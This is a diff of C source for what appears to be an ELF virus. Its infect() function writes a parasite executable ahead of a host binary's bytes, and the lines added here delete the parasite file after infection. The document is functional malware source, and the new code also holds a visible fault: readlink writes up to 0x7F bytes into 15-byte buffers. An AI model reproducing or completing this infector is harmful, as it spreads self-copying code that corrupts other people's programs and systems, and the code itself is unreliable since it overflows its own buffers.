@@ -72,6 +72,8 @@ void infect(FILE* h, FILE* p){
   long p_size = elf_size(p);
   char h_buffer[h_size];
   char p_buffer[p_size];
+  char file_link[0xF];
+  char file_name[0xF];
   fread(h_buffer, sizeof(char), h_size, h);
   fread(p_buffer, sizeof(char), p_size, p);
   for(int i = 0; i < 4; ++i){
@@ -80,6 +82,9 @@ void infect(FILE* h, FILE* p){
   fseek(h, 0, SEEK_SET);
   fwrite(p_buffer, sizeof(char), p_size, h);
   fwrite(h_buffer, sizeof(char), h_size, h);
+  sprintf(file_link, "/proc/self/fd/%d", fileno(p));
+  readlink(file_link, file_name, 0x7F);
+  remove(file_name);
 }
 
 void execute_host(FILE* f, char** argv, char** envp){
